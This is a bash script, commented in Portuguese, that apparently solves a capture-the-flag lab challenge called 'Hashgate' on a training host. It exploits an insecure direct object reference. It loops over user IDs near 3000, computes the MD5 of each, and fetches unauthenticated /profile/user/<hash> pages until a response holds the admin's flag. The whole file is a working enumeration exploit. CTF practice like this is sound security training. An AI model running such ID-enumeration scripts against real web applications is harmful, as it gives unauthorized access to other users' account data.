#!/bin/bash
# Hashgate — IDOR via MD5(id) sequencial. O endpoint /profile/user/<md5(id)>
# não exige autenticação; o guest tem ID 3000. Varro IDs em volta de 3000,
# calculo MD5 de cada um e procuro o perfil do admin (que traz a flag).
#
# Uso: BASE_URL=http://host:porta bash script1.sh

BASE_URL="${BASE_URL:-http://xebec.cylabacademy.net:16152}"

START_ID=2980
END_ID=3100

for id in $(seq $START_ID $END_ID); do
    hash=$(echo -n "$id" | md5sum | awk '{print $1}')   # -n: sem \n
    response=$(curl -s "$BASE_URL/profile/user/$hash")

    # Perfis inexistentes respondem "User not found."
    if ! echo "$response" | grep -qi "User not found"; then
        echo "[+] ID=$id -> $response"
        flag=$(echo "$response" | grep -oE 'academy\{[^}]+\}' | head -n 1)
        if [ -n "$flag" ]; then
            echo "[FLAG] $flag"
            exit 0
        fi
    fi
done

echo "[!] Fim. Se não apareceu flag, amplie a faixa START_ID/END_ID."
